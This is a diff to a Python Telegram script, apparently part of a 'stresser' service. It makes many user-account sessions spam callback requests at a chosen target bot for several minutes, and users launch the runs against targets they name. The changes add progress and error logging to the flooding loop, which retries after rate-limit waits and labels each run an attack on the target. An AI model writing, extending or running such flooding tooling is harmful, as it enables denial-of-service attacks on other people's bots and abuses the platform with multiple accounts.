@@ -116,34 +116,44 @@ async def _spam_callback_session(session: str, bot_username: str, msg_id: int, b
     """Одна сессия спамит callback до stop_event."""
     client = _get_client(session)
     count = 0
+    errors = 0
     try:
         await asyncio.wait_for(client.connect(), timeout=8)
         if not await client.is_user_authorized():
+            print(f"[STRESS] [{session}] ❌ НЕВАЛИД", flush=True)
             return 0
 
         await client.start()
         peer = await client.get_entity(bot_username)
+        print(f"[STRESS] [{session}] ✅ Начинаем спам callback...", flush=True)
 
         while not stop_event.is_set():
             try:
-                await client(GetBotCallbackAnswerRequest(
+                result = await client(GetBotCallbackAnswerRequest(
                     peer=peer,
                     msg_id=msg_id,
                     data=btn_data
                 ))
                 count += 1
+                if count % 10 == 0:
+                    print(f"[STRESS] [{session}] 📥 {count} callback отправлено | ответ: {type(result).__name__}", flush=True)
                 await asyncio.sleep(0.3)
             except FloodWaitError as e:
+                print(f"[STRESS] [{session}] 🌊 FLOOD {e.seconds}s", flush=True)
                 await asyncio.sleep(e.seconds)
-            except Exception:
+            except Exception as e:
+                errors += 1
+                if errors <= 3:  # первые 3 ошибки логируем
+                    print(f"[STRESS] [{session}] ⚠️ Ошибка #{errors}: {str(e)[:60]}", flush=True)
                 await asyncio.sleep(0.5)
 
     except Exception as e:
-        print(f"[STRESS] [{session}] ошибка: {str(e)[:50]}", flush=True)
+        print(f"[STRESS] [{session}] ❌ КРИТИЧЕСКАЯ ОШИБКА: {str(e)[:60]}", flush=True)
     finally:
         if client.is_connected():
             await client.disconnect()
 
+    print(f"[STRESS] [{session}] 🏁 Итог: {count} callback | {errors} ошибок", flush=True)
     return count
 
 
@@ -171,6 +181,7 @@ async def main_bot_stress(bot_username: str, user_id: int, username: str, is_adm
         return False  # сигнал — КД не ставить
 
     print(f"[STRESS] ✅ Кнопка найдена, запускаем атаку на {STRESS_DURATION//60} минут...", flush=True)
+    print(f"[STRESS] 📦 Сессий: {len(sessions)} | msg_id={msg_id} | btn_data={btn_data!r}", flush=True)
     await bot.send_message(
         user_id,
         f"⚡️ *Стрессер запущен!*\n*└─ Цель: {bot_username}*\n*└─ Продолжительность: 5 минут*",
